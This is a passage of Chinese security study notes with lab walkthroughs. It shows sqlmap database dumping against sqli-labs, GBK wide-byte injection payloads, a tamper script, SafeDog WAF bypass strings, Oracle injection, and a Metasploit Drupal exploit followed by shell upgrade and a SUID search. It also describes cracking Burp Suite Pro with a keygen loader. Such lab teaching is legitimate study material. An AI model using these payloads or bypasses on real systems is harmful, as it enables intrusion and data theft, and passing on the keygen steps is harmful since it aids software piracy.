+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--os-shell          提示交互式操作系统shell</span><br><span class="line">--os-pwn            提示外部shell, meterpreter或VNC</span><br></pre></td></tr></table></figure>
+
+<p>一般:<br> 这些选项可以用来设置一些常规工作参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--batch             永远不要求用户输入,使用默认行为</span><br><span class="line">--flush-session     清除当前目标的会话文件</span><br></pre></td></tr></table></figure>
+
+<p>杂项:<br> 这些选项不属于任何其他类别</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--wizard            简单向导界面用于初学者</span><br></pre></td></tr></table></figure>
+
+<p>[!] 要查看完整选项列表,请使用’-hh’</p>
+<p>查询数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.100/sqli/Less-1/?id=1&quot; --dbs</span><br></pre></td></tr></table></figure>
+
+<p>该代码运行期间会需要确定两次，直接输入y确定即可。</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224093602031.png" alt="image-20231224093602031"></p>
+<p>查询数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u &quot;http://192.168.2.100/sqli/Less-1/?id=1&quot;  --batch -D security --tables </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224094432296.png" alt="image-20231224094432296"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">[4 tables]</span><br><span class="line">+----------+</span><br><span class="line">| emails   |</span><br><span class="line">| referers |</span><br><span class="line">| uagents  |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>
+
+<p>可以看到security库中有这些表。</p>
+<p>查询数据表结构</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224095606959.png" alt="image-20231224095606959"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.33.128/Hackademic_RTB1/?cat=1&quot; --batch -D wordpress -T wp_users --column</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | int(3)      |</span><br><span class="line">| password | varchar(20) |</span><br><span class="line">| username | varchar(20) |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<p>查询表数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u &quot;http://192.168.2.100/sqli/Less-1/?id=1&quot;  --batch -D security -T users -C &quot;id,username&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224100006895.png" alt="image-20231224100006895"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+----------+</span><br><span class="line">| id | username |</span><br><span class="line">+----+----------+</span><br><span class="line">| 1  | Dumb     |</span><br><span class="line">| 2  | Angelina |</span><br><span class="line">| 3  | Dummy    |</span><br><span class="line">| 4  | secure   |</span><br><span class="line">| 5  | stupid   |</span><br><span class="line">| 6  | superman |</span><br><span class="line">| 7  | batman   |</span><br><span class="line">| 8  | admin    |</span><br><span class="line">| 9  | admin1   |</span><br><span class="line">| 10 | admin2   |</span><br><span class="line">| 11 | admin3   |</span><br><span class="line">| 12 | dhakkan  |</span><br><span class="line">| 14 | admin4   |</span><br><span class="line">+----+----------+</span><br></pre></td></tr></table></figure>
+
+<p>表的数据就可以直观的展示出来了</p>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p> 原理：mysql在使用 GBK 编码的时候，会认为两个字符为一个汉字，			例如%aa%5c 就是一个汉字（前一个ascii码大于128才能到汉			字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将’ 转换			为 &#39;</p>
+<p>因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：<br>        1、%df 吃掉 \ 具体的原因是 urlencode(‘) &#x3D; %5c%27，我们在%5c%27 前面添加%df，形<br>成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。<br>        2、将&#39;中的\过滤掉，例如可以构造%**%5c%5c%27的情况，后面的%5c会被前面的%5c<br>给注释掉。这也是bypass的一种方法。<br>例子： Less-32，33，34，35，36，37 </p>
+<p>​		1.正常情况下GPC开启或者使用addslashes函数过滤GET或POST提交的参数时，我们测试输入的’，就会被转义为&#39;;<br>​       2.若存在宽字节注入，输入%df%27时，经过单引号的转义变成了%df%5c%27，之后再数据库查询语句进行GBK多字节编码，即一个中文占用两个字节，一个英文同样占用两个字节且在汉字编码范围内两个编码为一个汉字。然后MySQL服务器会对查询语句进行GBK编码即%df%5c转换成汉字”運”,单引号逃逸出来，从而绕过转义造成注入漏洞</p>
+<p>MySQL在使用GBK编码时，两个字符组合，认为是一个汉字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">	西欧字母符号，通过1个字节来表示。东亚字符通过至少两个字节来表示。GBK编码就是用两个字节来表示中文区字符的一个编码标准。</span><br><span class="line">	GBK编码依然采用双字节编码方案，其编码范围∶8140一FEFE(高字节从81到FE，低字节从40到FE)，剔除xx7F码位，共23940个码位。</span><br><span class="line">条件</span><br><span class="line">	后台使用GBK编码的时候，存在着看不见的ascii码转换为GBK编码的转换过程，可以使用宽字节注入。</span><br><span class="line">原理</span><br><span class="line">编码转换存在着单字符被合并的情形</span><br><span class="line">反斜杠对应url编码%5c，是单字节的。</span><br><span class="line">在%5c前再加入一个单字节字符%dd（范围可以是81到FE之间)，就成了%dd%5cI</span><br><span class="line">而当后端使用GBK编码的时候，会将合理的两个单字节ANSCII字符解析成一个双字节的GBK编码字符</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df’-&gt;%df’-&gt; %df%5c%27(%df%5c是一个汉字)-&gt;(汉字)‘-&gt;id=(汉字)’ and (可以注入)</span><br></pre></td></tr></table></figure>
+
+<p>实操：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.45/sqli/Less-32/?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227193736656.png" alt="image-20231227193736656"></p>
+<p>输入1‘网页实际输出的却是1&#39;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p>试过各种后缀都无法正常报错，</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227194144122.png" alt="image-20231227194144122"></p>
+<p>这时候便可以用到%df</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.45/sqli/Less-32/?id=1%df&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227193958466.png" alt="image-20231227193958466"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.45/sqli/Less-32/?id=1%df&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227195143032.png" alt="image-20231227195143032"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.45/sqli/Less-32/?id=-1%df&#x27; union select 1,database(),3-- -</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.45/sqli/Less-32/?id=-1%df%27%20union%20select%201,database(),3--%20-</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227201951425.png" alt="image-20231227201951425"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.45/sqli/Less-32/?id=-1%df&#x27; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227203539322.png" alt="image-20231227203539322"></p>
+<p>2.宽字节注入防御方法</p>
+<p>（1）使用utf-8，避免宽字节注入；<br>ps:不仅在gbk,韩文，日文等等都是快字节注入漏洞</p>
+<p>（2）mysql_real_escape_string,mysql_set_charset(‘gbk,conn′);3.可以设置参数，charactersetclient&#x3D;binary只需在该语句中插入conn’);</p>
+<p>（3）可以设置参数，character_set_client&#x3D;binary只需在该语句中插入conn′);3.可以设置参数，charactersetclient&#x3D;binary只需在该语句中插入result&#x3D;mysql_query($sql)即可<br>result&#x3D;mysqlquery(“charactersetclient&#x3D;binary”,result&#x3D;mysql_query(“character_set_client&#x3D;binary”,result&#x3D;mysqlquery(“charactersetclient&#x3D;binary”,sql);&#x2F;&#x2F;就不会出现宽字节注入</p>
+<h5 id="宽字节与sqlmap"><a href="#宽字节与sqlmap" class="headerlink" title="宽字节与sqlmap"></a>宽字节与sqlmap</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1”</span><br><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df”</span><br><span class="line">python sqlmap.py -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” --current-user</span><br><span class="line">python sqlmap.py -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” --current-db（查数据库）</span><br><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” -D security --tables(当前数据库有哪些表)</span><br><span class="line"></span><br><span class="line">(当前表中有哪些字段)</span><br><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” -D security -T users --column</span><br><span class="line"></span><br><span class="line">(当前表中有哪些数据)</span><br><span class="line">sqlmap -u “http://192.168.222.4/sqli-labs/Less-32/?id=1%df” -D security -T users -C username,password --dump（使用dump来获取内容）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="其他注入sql演示"><a href="#其他注入sql演示" class="headerlink" title="其他注入sql演示"></a>其他注入sql演示</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,(select concat(1,2,3)),3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227204444058.png" alt="image-20231227204444058"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select 4,5,6;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227205052633.png" alt="image-20231227205052633"></p>
+<p>参数重复注入，网站选择情况</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227144128736.png" alt="image-20231227144128736"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.45/sqli/Less-1/?id=1&amp;id=2&amp;id=3&amp;id=4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231227205323912.png" alt="image-20231227205323912"></p>
+<p>php表示默认选择最后的参数。</p>
+<h5 id="sqlmap的tamper编写"><a href="#sqlmap的tamper编写" class="headerlink" title="sqlmap的tamper编写"></a>sqlmap的tamper编写</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload= payload.lower()</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27;or&#x27;</span> , <span class="string">&#x27;oorr&#x27;</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27;and&#x27;</span> , <span class="string">&#x27;anandd&#x27;</span>)</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27; &#x27;</span> , <span class="string">&#x27;%0B&#x27;</span>)</span><br><span class="line">    retVal=payload</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
+
+<p>将该temper文件拖进kali中，放在&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-v 3 --tamper=trrr --dbs --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/45adb2ac02c9d623f7d0447188f2301.png" alt="45adb2ac02c9d623f7d0447188f2301"></p>
+<p>成功显示</p>
+<h4 id="安全狗"><a href="#安全狗" class="headerlink" title="安全狗"></a>安全狗</h4><p><a target="_blank" rel="noopener" href="https://www.safedog.cn/website_safedog.html">安全狗下载</a></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240101215506347.png" alt="image-20240101215506347"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240101215541266.png" alt="image-20240101215541266"></p>
+<p>安装前请关闭phpstudy</p>
+<p>在a’pache的根目录下的bin目录运行该命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd.exe -k install -n apache2.4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240101220915117.png" alt="image-20240101220915117"></p>
+<p>出现该命令代表前置完成。</p>
+<p>直接一直点击下一步即可</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240101220115466.png" alt="image-20240101220115466"></p>
+<p>安全狗会自动搜索到apache的安装位置</p>
+<p>直接下一步即可</p>
+<p>到安装到最后会喊你注册一下，直接注册登陆即可</p>
+<p>在物理机试一下注入</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/68549f8a9e605539f11439d3fd655d4.png" alt="68549f8a9e605539f11439d3fd655d4"></p>
+<p>出现该图片代表安全狗配置成功</p>
+<h5 id="安全狗绕过"><a href="#安全狗绕过" class="headerlink" title="安全狗绕过"></a>安全狗绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union/*/!*!**/select 1,2,database/*!20553()*/--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%27%20union/*/!*!**/select%201,2,database/*///-*/()--+</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/563904977">相关知识</a></p>
+<p> 安全狗绕过的五种方法</p>
+<p>（一）内联注释(&#x2F;<em>![12345]</em>&#x2F;)绕过方法：</p>
+<ul>
+<li><p>&#x2F;<em>!select</em>&#x2F;: 相当于没有注释</p>
+</li>
+<li><p>&#x2F;<em>!12345select</em>&#x2F;: 当12345小于当前mysql版本号的时候，注释不生效，当大于版本号的时候注释生效。</p>
+</li>
+<li><p>&#x2F;<em>![]</em>&#x2F;: []中括号中的数字若填写则必须是5位</p>
+</li>
+</ul>
+<p>（二）</p>
+<p>  解析：</p>
+<ul>
+<li>图中两处 &#x2F;<em>!88888<a target="_blank" rel="noopener" href="http://www.hacker.wang/">www.hacker.wang</a></em>&#x2F; 即可绕狗 ：88888 肯定大于当前啊版本号，所以注释内容不执行，等于没有加这句话，不影响程序运行。</li>
+<li>下面的表名要换成16进制。</li>
+<li>注意database()中间有个空格</li>
+</ul>
+<p>  <img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/3050886-20221228124750828-1307027505.png" alt="img"></p>
+<p>（三）第三种绕过方法，精通mysql语法，自然懂的绕过方法</p>
+<p>解析：</p>
+<ul>
+<li><p>–:表示注释，在mysql中真正的注释是”– “，这里必须有个空格，否则不是注释，%0a是换行的url编码，换号后，表示重新查询，前面的注释对后面的语句将不再影响，这也要注意，</p>
+</li>
+<li><p>database空格(）这里，中间有个空格<br><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/3050886-20221228124836214-196635219.png" alt="img"></p>
+</li>
+</ul>
+<p>（四）第四种绕过方法，特殊的URL编码绕过安全狗</p>
+<p>  解析：</p>
+<ul>
+<li><p>此处%!a是一个错误的url编码，但这个编码比较特殊，可以绕狗，其他则不行。</p>
+</li>
+<li><p>这里的table_name 要 改成 table_name in (0x7573657273) 这种格式</p>
+</li>
+<li><p>database() 中间有个空格 database空格()</p>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/3050886-20221228124940937-1395034042.png" alt="img"></p>
+<p>（五）：第五种绕过方法，url另类传参绕过安全狗</p>
+<p>这里红色框处，当url参数出现两个同名参数时，将取最后一个参数的值，所以这里会取后面的tel的值，前面传参&#x2F;<em>,后面</em>&#x2F;闭合：</p>
+<p>绕过分析：安全狗误以为&#x2F;**&#x2F;是注释的内容所以全部忽略。</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/3050886-20221228125027462-1668417952.png" alt="img"></p>
+<h4 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h4><p>WAF是Web应用程序防火墙的英文缩写(Web Application Firewall),它是一个应用在网络层或操作系统层的安全设备或软件。</p>
+<p>作用：</p>
+<ul>
+<li><p>过滤恶意网络流量:</p>
+<p>识别和过滤恶意请求,如SQL注入、XSS攻击等。</p>
+</li>
+<li><p>应用层防护:</p>
+<p>针对Web应用本身进行防护,比如URL、HTTP头部、请求内容等深度分析。</p>
+</li>
+<li><p>防护Web服务:</p>
+<p>为Web服务器、Web应用程序提供安全防护,阻止常见攻击。</p>
+</li>
+<li><p>日志记录:</p>
+<p>记录所有Web请求日志,包括正常和异常请求,便于后期分析。</p>
+</li>
+<li><p>WAF规则管理:</p>
+<p>支持自定义规则以识别更多攻击模式。</p>
+</li>
+<li><p>动态防护:</p>
+<p>根据运行时行为实时学习并更新防护策略</p>
+</li>
+</ul>
+<h4 id="Oracle数据库sql注入"><a href="#Oracle数据库sql注入" class="headerlink" title="Oracle数据库sql注入"></a>Oracle数据库sql注入</h4><p>空格需要使用+代替</p>
+<p>Oracle数据库注入时的字符需要有三个字符如abc，def</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union+select+&#x27;abc&#x27;,+&#x27;def&#x27;+from+xxxx</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT+BANNER,+NULL+FROM+v$version;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231228160645883.png" alt="image-20231228160645883"></p>
+<p>Oracle没有数据库名的概念，所谓数据库名，即数据表的拥有者，也就是用户名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BANNER在Oracle数据库中是一条内置的SQL函数,它的功能是返回Oracle版本信息。</span><br><span class="line"></span><br><span class="line">具体来说:</span><br><span class="line"></span><br><span class="line">- BANNER是Oracle数据库提供的内置函数之一。</span><br><span class="line">- 当调用SELECT BANNER FROM DUAL时,它会返回Oracle数据库的版本信息。</span><br><span class="line">- 返回信息包含Oracle版本号、编译日期等详细信息。</span><br><span class="line">- 例如对于Oracle 11g,它可能返回:</span><br><span class="line"></span><br><span class="line">Oracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit Production</span><br><span class="line"> PL/SQL Release 11.2.0.4.0 - Production</span><br><span class="line"> &quot;CORE   11.2.0.4.0  Production&quot;</span><br><span class="line"> TNS for Linux: Version 11.2.0.4.0 - Production</span><br><span class="line"> NLSRTL Version 11.2.0.4.0 - Production</span><br><span class="line"></span><br><span class="line">- 通过BANNER可以快速获取Oracle数据库的详细版本信息。</span><br><span class="line">- 这对数据库管理和应用开发都很有帮助。</span><br><span class="line"></span><br><span class="line">所以总结来说,BANNER是Oracle内置函数,用于返回数据库版本的详细Banner信息,是常用的Oracle信息获取函数之一。</span><br></pre></td></tr></table></figure>
+
+<h4 id="BurpSuitePro"><a href="#BurpSuitePro" class="headerlink" title="BurpSuitePro"></a>BurpSuitePro</h4><p>请提前安装好jdk19</p>
+<p>解压完压缩包后</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231228210933559.png" alt="image-20231228210933559"></p>
+<p>在根目录下运行cmd</p>
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar burp-loader-keygen-2_1_06.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231228211134407.png" alt="image-20231228211134407"></p>
+<p>双击运行BurpSuitePro.exe</p>
+<p>将burp suite中的内容（License）copy到Burp Suite Professional中</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231228211918049.png" alt="image-20231228211918049"></p>
+<p>再将Burp Suite Professional的内容返回给burp suite</p>
+<p>后面全部点next即可。</p>
+<p>命令行窗口请不要关闭</p>
+<h6 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h6><p>点击代理，选择其中的“打开内嵌浏览器”</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231228212217901.png" alt="image-20231228212217901"></p>
+<p>在跳出的浏览器中输入要sql注入的网站。</p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>以下操作均在kali中执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.30.139&quot; -x 403,404 </span><br></pre></td></tr></table></figure>
+
+<p>查询该网站有哪些文件，方便后续攻击（耗时很久）</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/pic1.png" alt="pic1"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/pic2.png" alt="pic2"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>打开msfconsole</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/pic3.png" alt="pic3"></p>
+<p>每次显示的图都不一样。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/pic4.png" alt="pic4"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/pic5.png" alt="pic5"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/pic6.png" alt="pic6"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.2.88</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/pic7.png" alt="pic7"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/pic8.png" alt="pic8"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/pic9.png" alt="pic9"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/pic10.png" alt="pic10"></p>
+<h5 id="查询ip下有哪些主机"><a href="#查询ip下有哪些主机" class="headerlink" title="查询ip下有哪些主机"></a>查询ip下有哪些主机</h5><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/pic11.png" alt="pic11"></p>
+<h3 id="账号爆破（Pikachu）"><a href="#账号爆破（Pikachu）" class="headerlink" title="账号爆破（Pikachu）"></a>账号爆破（Pikachu）</h3><p>使用 Pikachu 漏洞练习平台</p>
+<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>进入pikachu-master根目录下</p>
+<p>更改inc&#x2F;config.inc.php文件</p>
